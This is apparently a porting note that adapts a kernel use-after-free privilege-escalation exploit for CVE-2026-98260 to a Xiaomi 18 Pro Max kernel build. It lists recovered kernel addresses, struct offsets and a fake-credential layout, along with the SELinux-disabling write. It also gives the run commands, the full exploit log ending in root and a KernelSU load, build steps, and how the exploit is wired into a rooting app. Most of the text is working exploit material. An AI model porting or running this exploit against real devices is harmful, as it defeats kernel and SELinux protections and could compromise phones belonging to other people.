# Xiaomi 18 Pro Max (madrid) 6.18.21 CVE-2026-98260 Adaptation

Same 6.18.21 chain as the OnePlus 16 profiles, with a new per-build entry in the
`kernel_builds[]` table of `exploit/src/K61821_plant.c` (the default
`libk61821.so` runner — no per-kernel `.so` selection change is needed). The
three existing entries keep their values; the table gained one new field,
`task_bytes`, because this build's `struct task_struct` is **5760** bytes and the
engine previously filtered the task leak with a hardcoded 5248.

Verified end to end on the device: root with `kernelsu` late-loaded,
`uid=0(root) … context=u:r:ksu:s0`.

## Target

- Model: Xiaomi 18 Pro Max, `2611FPNFAG`, device codename `madrid`, product
  `madrid_eea`, region `eea`
- SoC: Snapdragon 8 Elite Gen 5 (`SM8975`)
- System: HyperOS `ro.build.version.incremental=OS4.0.3.0.XEOEUXM`,
  build `CP2A.260605.016`, Android 17,
  fingerprint `Xiaomi/madrid_eea/madrid:17/CP2A.260605.016/OS4.0.3.0.XEOEUXM:user/release-keys`
- Kernel: `6.18.21-android17-5-g73d8f0bd19e0-ab16191870-4k`
  (`#1 SMP PREEMPT Thu Aug 27 10:24:39 UTC 2026`, `kleaf@build-host`,
  Android clang 22.0.1 based on r584948c, LLD 22.0.1)
- KMI: `android17-6.18`
- Kernel config that matters here: `ARM64_BTI_KERNEL`, `SHADOW_CALL_STACK`,
  `RANDOMIZE_BASE`, `KASAN=y` + `KASAN_HW_TAGS=y` (cmdline adds `kasan=off`),
  `TRACING`/`FTRACE`/`TRACING_MAP`, `STRICT_KERNEL_RWX`, `KALLSYMS_ALL`,
  `MODULE_SIG` **without** `MODULE_SIG_FORCE`, no `CFI_CLANG`, no `USER_NS`
- Runtime facts: SELinux Enforcing, `perf_event_paranoid = -1`,
  page size 4096, kernel link base `0xffffffc080000000`,
  `PAGE_OFFSET 0xffffff8000000000` (physical memory sits ~32 GiB up, so slab
  pointers look like `0xffffff8…`)

## Kernel image and extraction

The device build is the stock GKI image shared with the public images package
`OS4.0.8.0.XPOMIXM.zip` (`tornado_global-ota_full-OS4.0.8.0.XPOMIXM-user-17.0`,
109,138,697 bytes, SHA-256
`4012441953045eb258f4c11fa612f342adcd18a8f58ca4a2042e045fd865862a`):

- `root_files/boot.img` — 67,108,864 bytes, SHA-256
  `88f6902556cd1cef6960466294453348d821972d3bb2a6429e01fa79bf12d542`,
  `ANDROID!` v4 header, `kernel_size=20,692,411`, `ramdisk_size=0`,
  `vendor_ramdisk_size=0`, `pages=1584` (inconsistent with `kernel_size`; the
  vendor image does not use it)
- The kernel sits at page 1 (`0x1000`) as an **LZ4 legacy-format stream**, magic
  `02 21 4c 18` (`LEGACY_MAGICNUMBER = 0x184C2102`). Legacy framing is
  `[u32 LE block size][block]…` with 8 MiB blocks and **no** `flg` byte and no
  standard-frame descriptors — `lz4.frame` cannot read it (it reports
  `Decoding Failed ! Corrupted input detected !` after 8 MiB), while
  `lz4.block` with `uncompressed_size = 1 << 23` per block decodes it cleanly, as
  does `lz4 -d` from lz4 1.10.0 (`programs/lz4io.c`, `LEGACY_BLOCKSIZE = 8 MB`).
- Decoding consumed exactly `kernel_size` stored bytes (6 blocks) and produced
  the 43,137,536-byte Image, SHA-256
  `627750a1776c7ac2a215b13af8a0810c4495554e899992f86a69841899dbde5a`, whose
  banner is byte-identical to the phone's `/proc/version`.

## Constants

Recovered with `ports/coloros-61269/recover.py`
(`kallsyms: n=143594 names=0x160f538..0x1825623 offsets=0x1826488
base=0xffffffc080000000 monotonic=OK shift=+0`):

| field | value | cross-check |
|---|---|---|
| `timer_link` | `0xffffffc0803dd224` | `do_timer_create 0x803dd16c`, `BL kmem_cache_alloc_noprof` at `+0xb4`, site `+0xb8` |
| `rb_alloc_link` | `0xffffffc0806b2a68` | `rb_free 0x806b2e80 − rb_alloc = 0x418 = RB_ALLOC_LEN`; entry prologue is `paciasp` |
| `selinux_link` | `0xffffffc082989630` | `sel_read_enforce`/`sel_write_enforce` touch this exact address |
| `user_ns_link` | `0xffffffc0827010d8` | `init_user_ns`, gap `0x2b0` to `root_user` |
| `root_user_link` | `0xffffffc082701388` | `root_user` |
| `groups_link` | `0xffffffc082702a48` | `init_groups` (8 bytes, then `init_cred`) |
| `ucounts_link` | `0xffffffc082702f08` | `init_ucounts` |
| `task_link` | `0xffffffc080214d98` | `copy_process 0x80214c58`, `BL kmem_cache_alloc_node_noprof` at `+0x13c`, site `+0x140` |
| `task_bytes` | `5760` | live ftrace `name=task_struct bytes_req=5760` |

`tools/kernel_profile_check.py <Image> --site …` confirms both call sites: the BL
sits at `site-4` (`0x97f5ddf0 → 0x801549e0`, `0x97fd0540 → 0x80156294`) and the
site itself is the landing pad (`0xaa0003f4`), i.e. the site is the *return
address inside* `do_timer_create`/`copy_process`, which is what the
`kmem_cache_alloc` tracepoint records.

The five data symbols sit at the same low-order offsets as both OnePlus 16
entries (`…630`, `…0d8`, `…388`, `…2a48`, `…2f08`); only the section base moved,
which is what an identically-configured build should do.

## Layout cross-checks (disassembly of the same Image)

Everything the engine hardcodes outside the profile table was checked against
this kernel:

- `commit_creds`: `mrs x20, SP_EL0`; `ldr x19,[x20,#0x900]` (`real_cred`),
  `ldr x8,[x20,#0x908]`, `add x8,x20,#0x908; stlr x21,[x8]` →
  `TASK_CRED 0x908` ✓
- `__put_cred`: key rings at `0x60…0x78`, then `[*,#0x80]` `security`,
  `0x88` `user`, `0x90` `user_ns`, `0x98` `ucounts`, `0xa0` `group_info` →
  matches the fake-cred pattern writes at 128/136/144/152/160 ✓, and the five
  `FULLCAP` words at `0x30…0x50` cover all five `kernel_cap_t` members ✓
- `posix_timer_fn+0x34`: `sub x0, x21, #0xe0` (`container_of` back to
  `k_itimer`) → `KITIMER_NODE 0xe0` ✓, and `KITIMER_SIZE 0x180` is confirmed by
  the 2048/2048 record match below ✓
- `sel_write_enforce`: `adrp x24, 0x2989000` + `strb w25, [x24, #0x630]` →
  `enforcing` is the **first byte** of `selinux_state`, inside the 8-byte write
  window of the engine's `selinux_state - 7` tile target ✓ (the 7 bytes before
  are `avc_latest_notif_update.notif_lock`, zeroed into its unlocked state —
  same collateral as the OnePlus builds)
- `sizeof(struct task_struct)` is **not** the old `TASK_ALLOC_BYTES 5248`; the
  allocations report 5760. That constant is now the per-profile `task_bytes`.

## On-device verification

Everything below ran as `adb shell` (uid 2000, `u:r:shell:s0`, group
`readtracefs`) — the same domain the app's Shizuku/Stellar backend uses. The
runner dispatches `run | ksud | __plant <plant args>`, so plant modes are
`./k61821-probe __plant --probe`.

Tracefs access matrix found on this phone: writable `tracing_on`,
`buffer_size_kb`, `events/kmem/rss_stat/enable`, `events/kmem/rss_stat/trigger`,
`per_cpu/cpu0/trace`; readable `per_cpu/cpu0/trace_pipe_raw` (`-r--r-----`
root:readtracefs); denied every `events/**/enable` and `events/**/format`, plus
`per_cpu/cpu0/buffer_size_kb`. So `event_on()` must take its
`enable_event:<ev>` trigger fallback — with Enforcing that is the only path, and
it works.

| mode | result |
|---|---|
| `__plant --probe` | `PROBE_KERNEL=6.18.21-android17-5-g73d8f0bd19e0-ab16191870-4k`, `PROBE_RSS=yes`, `PROBE_TRIGGER=yes`, `PROBE_TRACE=yes bytes=1047788`, `PROBE_SELINUX=enforcing`, `PROBE_UID=2000`, `PROBE_OK` |
| `__plant --slide-probe` | `LEAK_CPU cpu=0 raw=184320 rec=2048`, `SLIDE_DERIVED=0x1627c00000 site=0xffffffd6a7fdd224`, `LEAK_TIMERS n=2048`, `SLIDE_PROBE_OK ms=84` |
| `__plant --spray-probe` | `SPRAY_CREATE n=4096`, `SPRAY_SEND ok=4096`, `SPRAY_CLOSE ms=44` |
| `__plant --perf-probe --slide 0x1627c00000` | `PERF_PROBE_FAIL found=0` |

The slide probe is the decisive profile test: 2048 `k_itimer` records whose
modal call site is exactly `timer_link + 0x1627c00000`, 2 MiB-aligned as the
derivation requires. If `timer_link` were wrong the modal site would not clear the
alignment filter and the probe would print `LEAK_BAD`.

`copy_process + 0x140` was confirmed independently by reading the text trace
while forking:

```
kmem_cache_alloc: call_site=copy_process+0x140/0x16e8 ptr=… name=task_struct
                bytes_req=5760 bytes_alloc=5760 gfp_flags=GFP_KERNEL node=-1
```

(72 such records; enabling `kmem:kmem_cache_alloc` for this test was done through
the `rss_stat` trigger, and the trigger, `rss_stat`, `tracing_on` and
`buffer_size_kb` were restored to `1410` afterwards.)

`--perf-probe` failing is not a profile problem: `rb_alloc_link` is used *only*
by that probe, which asks whether the perf ring-buffer user page is slab-allocated
through `rb_alloc` so it could serve as a repairable fake-cred page. On this
build the only 4096-byte record in the window came from outside `[rb_alloc,
rb_alloc+0x418)` (`off_rb=0xffffffffffaa0c9c`), so the optional trick is simply
unavailable; the main pipeline does not use it.

## Full run

Manager present on the device: KernelSU `me.weishu.kernelsu` v3.3.1
(versionCode 32680); `find_ksud` picked
`…/lib/arm64/libksud.so` (`SOURCE=manager-apk`,
`KSUD_VERSION=ksud 3.3.1 (uapi: 5)`), which supports `late-load`. No KSU module
was loaded before the run (`kernelsu` absent from `/proc/modules`).

```
PYB110_DIR=/data/local/tmp PYB110_MANAGER=kernelsu PYB110_SUSFS=0 PYB110_VFS=0 \
PYB110_UNIVERSAL=0 PYB110_UNLOAD_GUARD=0 PYB110_DISABLE_ANTIROOT=0 PYB110_GATE=0 \
./k61821-probe run
```

Stage summary (plant budget 240 s, whole plant 22.3 s):

```
PROBE_OK
SLIDE=auto BUDGET=240s
STAGE=selinux T=1ms
  SLIDE_TRY=1…14  → LEAK_TIMERS n=2048, SLIDE_DERIVED=0x1627c00000 every attempt,
                   RECLAIM_WRITES=4096 HIT=0, SLIDE_MISS=n enforce=1
  SLIDE_TRY=15    → RECLAIM_WRITES=4096 HIT=1 base=a111c, REAP code=2, UAF mode=tile rc=0
SELINUX=permissive
STAGE=task T=13207ms   LEAK_TASK ptr=ffffff80b28aad00 attempt=1
STAGE=cred T=13294ms   CRED_INSTALLED=0xffffff8a70080ce0 attempt=1 → CRED_NOT_ROOT
  9 zero-repair tile writes (HIT=0), cred installs attempt=2…7 (HIT=0),
  CRED_INSTALLED=0xffffff899352f5e0 attempt=8 → CRED_NOT_ROOT,
  tile write HIT=1 base=9a600e
CRED_REPORT=ROOT uid=0 caps=0 test=1 tcap=1ffffffffff
  out=U=0|Uid:	0	0	0	0|CapEff:	000001ffffffffff|
STAGE=late-load T=22332ms   LATE_LOAD_RC=0  LATE_LOAD_SHELL_RC=0
PARKED=1
MODULE_LOADED
SU_ID_RC=0   uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
             kernelsu 192512 0 - Live 0x0000000000000000 (O)
DONE   exit=0
```

Afterwards SELinux reads `Enforcing` again, `kernelsu` is live, and the plant plus
its cred child park (`PARKED=1`) so the sprayed pages stay held. A same-boot rerun
prints `ALREADY_LOADED: kernelsu present, skip exploit/load`; a fresh exploit
attempt needs a cold reboot first.

## Reliability notes

- The SELINUX stage is the low-probability step: 4096 sprayed writes per attempt,
  and it took 15 attempts here (each 0.4–2.8 s). The 240 s budget is generous for
  that, but expect a run of tens of seconds rather than a second.
- The slide is derived inside every attempt from the 2048 timer allocations;
  nothing about this port hardcodes `0x1627c00000`.
- The vendor cmdline carries `ftrace_dump_on_oops` and the vendor bootconfig
  suggests `panic_on_oops 1`, so a mis-landed write is likely to reboot the phone
  instead of failing quietly. `panic_on_warn` is not readable from `adb shell`
  on this build.
- `task_bytes` is what makes `LEAK_TASK` find anything: a profile with the wrong
  size fails closed with 40 `LEAK_TASK retry=` lines and no crash. Check
  `name=task_struct bytes_req=` in ftrace before trusting a new build.
  The Xiaomi 18 Pro (`hongkong`) entry still carries the OnePlus `5248`; its
  comment now says so.
- Gotcha when driving the plant from a shell one-liner: `stale_plant()` scans
  `/proc/*/cmdline` for `__plant`, so a command line that mentions that string
  makes the runner print `STALE_PLANT` and exit 12 without touching anything.
  Run `run` from a command line that does not contain the literal.

## Building

`build.rs` defaults `PLANT_SRC` to `../src/K61821_plant.c`, so `libk61821.so`
carries this table. On a Linux host `.cargo/config.toml` hardcodes a darwin NDK
linker, so override it:

```sh
export ANDROID_NDK_HOME=/path/to/ndk/28.2.13676358
export CARGO_TARGET_AARCH64_LINUX_ANDROID_LINKER=$ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android31-clang
cd exploit/rust-k61821
CARGO_TARGET_DIR=target/k61821 cargo build --release --target aarch64-linux-android
cp target/k61821/aarch64-linux-android/release/k61821 \
   ../../app/app/src/main/jniLibs/arm64-v8a/libk61821.so   # 442,344 → 442,576 bytes
```

## App integration

`PROFILE_BY_RELEASE` maps `6.18.21-android17-5-g73d8f0bd19e0-ab16191870-4k` to
`ExploitKind.CVE61821`, and the `CVE61821` command list falls through its `else`
branch to `libk61821.so`, so no `.so`-selection change was needed. The shipped
library is the same bytes as the build:

```
sha256  46270ed18a1a7229166be290171c19118a50e7ea6d0fe3c0eb1548edd2b88d9b
        exploit/rust-k61821/target/k61821/…/release/k61821
        app/app/src/main/jniLibs/arm64-v8a/libk61821.so
        base.apk!lib/arm64-v8a/libk61821.so            (442,576 bytes)
/data/app/…/com.shark.kty-…/lib/arm64/libk61821.so     (installed, same digest)
```

`strings` on the installed `lib/arm64-v8a/libk61821.so` finds the new release
string next to the Xiaomi 18 Pro one, i.e. the table in the shipped library is
the edited one.

Installed the debug APK (`app/build/outputs/apk/debug/app-debug.apk`,
`versionName 2.5.1`, `versionCode 103`, 83,051,083 bytes, SHA-256
`f91f343379699846d5d7d5edf379f1608d6a3ea34b3a38936371fec24d5aa97c`). Plain
`adb install` fails on HyperOS with `INSTALL_FAILED_USER_RESTRICTED: Install
canceled by user` unless Developer options → *Install via USB* is on; pushing to
`/data/local/tmp` and running `su 0 pm install -r -t` works instead.

Launched the app and read the Home card through `uiautomator dump` (no root flow
started):

| field | value the app shows |
|---|---|
| Kernel version | `6.18.21-android17-5-g73d8f0bd19e0-ab16191870-4k` |
| Exploit | `CVE-2026-98260-6.18` (not *Unsupported device*) |
| Device model | `Xiaomi 18 Pro Max` |
| Status | `Shizuku authorized` / `Connected to Shizuku - ready to root` |

`Os.uname().release` matches the table key exactly, `resolveDeviceName()` needs
no entry (it takes `ro.product.marketname`, which is already `Xiaomi 18 Pro Max`
here), and Shizuku (`shizuku_server`, started over adb) is picked up by
`PrivService.pick()`.

`isXiaomiPortKernel()` was left alone on purpose: it drives
`hidesOplusOnlyOptions()`, and the two switches it would hide are inert on this
phone — `getprop init.svc.riskdetect` is empty and `/proc/modules` contains no
`oplus*` module, so `stop riskdetect` and `rmmod oplus_secure_guard_new` fail
without side effects. The other Xiaomi entries leave them visible too.
